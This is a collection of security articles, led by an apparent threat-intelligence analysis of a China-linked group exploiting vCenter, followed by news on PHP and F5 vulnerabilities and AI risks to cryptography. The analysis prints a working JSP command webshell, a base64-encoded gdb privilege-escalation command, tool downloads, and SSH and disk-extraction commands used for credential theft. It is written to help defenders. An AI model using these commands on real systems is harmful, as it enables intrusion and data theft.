title: ARMORY CASTLE Exploits vSphere
raw_text:
Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05 . We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local . Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service ( vmdird ) RPC interface vmdirdbcp . We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui . The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp , tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123 . if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("
"); while((c=a.read(d))!=-1){out.print(new String(d,0,c));} while((c=b.read(d))!=-1){out.print(new String(d,0,c));} out.print("
"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...) , the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output ( getInputStream() ) and standard error ( getErrorStream() ), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code ( \nEXIT: ). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp , tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/ , and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp , and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env . ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env , any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local . BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir , forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309 , primarily the obtaining of the shared session key "K" without knowing the password , there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/ . BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py . SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm . Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear . The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “ 23345 ” and “ SSH-2.0-pulsesecure_23345 ”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local . Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh . Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t "/vmfs/volumes//.a ". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz . python vmfs_browser.py -d "/dev/disks/vml.:1" ls . python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk" python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2" python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./ python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz , copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz" , and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys ) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data. /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128] Figure 14: ARMORY CASTLE SSH Tunnel ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES ( /usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands ( cmd , upload , download , and sleep ) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog , the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py , alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single campaign indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE -2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide . This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch . The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool . This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. VCSA Hardening Feature Impact on the ARMORY CASTLE Attack Chain Protection Against Future Zero-Days VCSA iptables Inbound DROP Policy & Connection Logging (Management Ports) The nmap scans targeting TCP ports 443, 5480, and 22 are silently dropped because the attacker's source IP is not in the trusted whitelists. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. VCSA iptables Inbound DROP Policy (TCP 443) Even if BONESAW extracts the SAML key over port 2012, the attacker cannot utilize the SAWSNAKE-forged administrative cookies. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials. Table 1: VCSA Hardening Features Note: When implementing iptables-based rules, we strongly advise rigorous testing and formal change control processes prior to production implementation. title: PHP2Shell aftershock: 18 more PHP flaws put enterprise web admins on alert
raw_text: PHP continues to root out flaws in its architecture, this week releasing fixes for a slew of additional security issues in the wake of PHP2Shell. The patches address 18 vulnerabilities , including a critical request smuggling flaw that could allow unauthenticated attackers to remotely execute code on vulnerable servers. Other vulnerabilities affect PHP’s core engine, session handling, process manager, and Common Gateway Interface (CGI) protocol, which bridges web servers with external application programs. The updates were released for all supported PHP versions, with PHP 8.5.13, 8.4.28, 8.3.37, and 8.2.36 containing the fixes. The disclosure comes as enterprises continue to grapple with the full impact of PHP2Shell , a pair of 9.2-severity-rated vulnerabilities disclosed in October. The flaws prompted the outright shutdown of some government websites, and, by some estimates, have borne the brunt of millions of exploit attempts . “Enterprises should read this release as PHP2Shell’s aftershock: Smaller, but it shakes the same walls,” said Frank Dickson of Dickson Research. Flaws enabling RCE, DoS, memory corruption One of the most serious flaws disclosed this week, CVE-2026-129289 , is rated a critical 9.2 on the Common Vulnerabilities Scoring System (CVSS). The request smuggling vulnerability impacts PHP-FPM, a background service that executes code for high-volume websites and apps. If exploited, the flaw could allow unauthenticated actors to execute PHP code remotely on vulnerable servers that reuse connections to PHP-FPM under certain conditions. It impacts specific nginx, Apache, HAProxy, and LSAPI configurations that reuse backend connections to PHP-FPM. When paired with a code execution bug, it can “ carry an attacker from the web worker toward the whole server,” Dickson explained. Several of the other patches also address vulnerabilities that could allow remote code execution (RCE). Still others address issues including information disclosure, memory corruption, denial-of-service (DoS) interruptions, potentially unsafe handling of HTTPS and FTPS URLs, and cross-site scripting. While there may be heavy focus on the 9.2-rated CVE-2026-129289, the lesser flaws still matter, Dickson said. For instance, in one case, one capital letter turned off encryption; a URL written as HTTPS:// or FTPS:// with an uppercase S could send passwords, tokens, form data, and files in plaintext, even through a redirect, to anyone watching the network. Not quite PHP2Shell level, but still high priority An attacker who exploits a PHP code-execution flaw gains access to whatever the PHP worker can touch, “which is just about everything,” Dickson said. Successful exploitation executes code with the privileges of the PHP worker, which holds the database password, API keys, cloud credentials, and session data. For example, he described what he called an “ugly” attack path: The threat actor gets in through the web application. Reads the configuration file; Dumps the customer database; Plants a web shell to come back later. He pointed out that PHP warned that PHP2Shell puts every installation serving web requests at risk, with no login required. “This release returns to the same neighborhood: session upload progress, fatal error backtraces, and how PHP behaves when it runs out of memory,” he said. Fritz Jean-Louis , principal cybersecurity advisor at Infotech, agreed that this is a high-priority patching event, if not a PHP2Shell-level emergency. Although several of the critical vulnerabilities require specific configurations or uncommon deployment scenarios, “they still affect one of the most widely deployed web runtimes in the world,” he noted. RCE is the most concerning outcome, as it can give an attacker control over the application server. From there, they may be able to access sensitive business data, steal credentials or session tokens, deploy persistent backdoors, modify application behavior, or use the compromised system as a foothold for deeper intrusion. “Even vulnerabilities that appear less severe, such as information disclosure or memory corruption, can become highly impactful when chained together by a determined attacker,” Jean-Louis said. What enterprises should do now Dickson emphasized the a PHP version number alone will not tell security teams whether they are exposed. Checking the version number is the easy part, but Linux distributions often backport fixes without changing the version string, so the package changelog tells more than the version number does. The hard part is finding every copy: Web servers, containers, hosting control panels, and appliances can all quietly bundle PHP, Dickson said. Then check the settings that matter: Is session upload progress on? Do PHP 8.5 workers include arguments in error backtraces? Does php-cgi face the internet? Is the PHP-FPM status page reachable from outside? He advised security teams to start with internet-facing PHP 8.5 servers, anything with session upload progress enabled, and any setup where several applications share one session store. PHP 8.5 should be first because it is the only branch exposed to the new backtrace flaw, and fatal error backtraces are on by default there, he explained. “Then patch everything else on a normal fast cycle,” Dickson said. He pointed out that PHP 8.2 has just six weeks to live; it will receive no security fixes after December 31, 2026. That means this release may be one of the last it receives. Running 8.2 into January is a risk decision; PHP 8.1 and older, meanwhile, receive no fixes from the PHP project. Interestingly, PHP’s advisory for the new PHP 8.5 backtrace flaw says a change in 8.5.12, the PHP2Shell release, is what made the new attack path reachable. “Emergency fixes are built fast, and fast work sometimes creates a new vulnerability ,” Dickson noted. In light of this, his advice is to preserve the PHP inventory built for PHP2Shell, “and keep it current,” because no one ever said during an incident, “We knew about too many of our PHP servers.” Understanding everywhere PHP runs Jean-Louis agreed that security teams should immediately inventory all PHP deployments, including those embedded in vendor products and appliances. They should also prioritize internet-facing systems, verify PHP-FPM and session management configurations, and deploy the latest supported PHP versions “as quickly as operationally feasible.” Organizations should view this as a continuation of the lesson learned from PHP2Shell, he said: Runtime vulnerabilities deserve the same attention as application vulnerabilities. While PHP2Shell was more “immediately exploitable” and quickly attracted real-world attacks, this release reinforces the need for strong asset inventory, rapid patch deployment, and visibility into underlying software components. “The biggest question for CISOs is not whether they run PHP; it’s whether they know everywhere it runs,” Jean-Louis said.

Other vulnerabilities affect PHP’s core engine, session handling, process manager, and Common Gateway Interface (CGI) protocol, which bridges web servers with external application programs. title: F5 scrambles to fix more critical BIG-IP security flaws
raw_text: F5 has released a batch of out of band patches for BIG-IP Access Policy Manager (APM) and BIG-IP iRule programmable scripting, five of which are rated 9.8 (Critical) in severity. BIG-IP Access Policy Manager (APM) is the vendor’s application access management and security product while BIG-IP iRules lets network administrators customize how BIG-IP handles application traffic. All five of the patches are stack-based buffer overflows that could let an unauthenticated threat actor terminate the Traffic Management Microkernel (TMM) and execute code remotely on vulnerable systems. F5 described them as follows: CVE-2026-121805 : When an iRule that processes client traffic using the PEM:subscriber command is configured on a virtual server, undisclosed requests can cause the Traffic Management Microkernel (TMM) to terminate and may lead to remote code execution (RCE); CVE-2026-120292 : When an HTTP profile and an iRule using the MR:message route command are configured on a virtual server, undisclosed requests can cause the Traffic Management Microkernel (TMM) to terminate and may lead to remote code execution (RCE); CVE-2026-120285 : When an HTTP profile and an iRule containing the PSC:ip_address command are configured on a virtual server, undisclosed requests can cause the Traffic Management Microkernel (TMM) to terminate and may lead to remote code execution (RCE); CVE-2026-116953 : When an iRule that processes client traffic using the GENERICMESSAGE:route command is configured on a virtual server, undisclosed requests can cause the Traffic Management Microkernel (TMM) to terminate and may lead to remote code execution (RCE); CVE-2026-123637 : When BIG-IP APM is provisioned and a per-request policy that includes the Client Information agent and Endpoint Security agents is applied to a virtual server, undisclosed requests can cause the Traffic Management Microkernel (TMM) to terminate and may lead to remote code execution (RCE). The company said there are no mitigations for the flaws and advised customers to install the hotfixes on vulnerable devices, and to upgrade vulnerable versions without a listed fix to a patched version. In the same batch of out of band patches, F5 also addressed CVE-2026-126822 , a high severity integer underflow vulnerability in BIG-IP APM SAML that could also crash TMM and lead to denial of service. This is the second critical issue in two months for APM; September’s zero-day bug was already being exploited when it was patched. F5 did not indicate that any of the current batch is as yet being exploited but given the growing trend of attacks on edge devices by criminals and nation-state threat actors, admins should update systems as soon as possible. This article originally appeared on NetworkWorld .

title: Do AI’s mathematical advances put PKI under threat?
raw_text: Warnings by a leading cryptographer that industry-wide public-key cryptography could fail because of advances in AI has sparked a debate in the security community. In a series of post on X, Johns Hopkins cryptographer Matthew Green warned that existing public-key cryptography systems were at risk because machines have begun outperforming humans in their ability to address some mathematical problems. “I think there is a 1% chance we live in Minicrypt, and a 15% chance we functionally lose confidence in our existing public-key encryption algorithms,” Green wrote last month. Green’s initial warning and follow-up comments offered a warning about the cryptographic foundations beneath public key infrastructure (PKI) , rather than an obituary for PKI, the system of certificates, keys, and certificate authorities that secures Transport Layer Security (TLS), code signing, and many other information security functions. “I’m worried about standardized public-key encryption (and some signatures) and specifically the fact that most of it is based on a small number of hard problems,” Green added . These hard mathematical problems have been extensively analyzed by humans for years but any comforting notion that this means they are safe is now being undermined because machines have begun outperforming humans in solving some mathematical problems. Green warns that a disruptive loss of confidence in internet security systems would arise if a major cryptanalytic surprise arrives faster than standards and deployments can adapt — so the industry needs to focus on improved cryptographic agility. The comments sparked a discussions on LinkedIn and elsewhere about how public-key crypto could fail . Green is yet to respond to CSO’s request for comment on the debate he sparked. Markku-Juhani O. 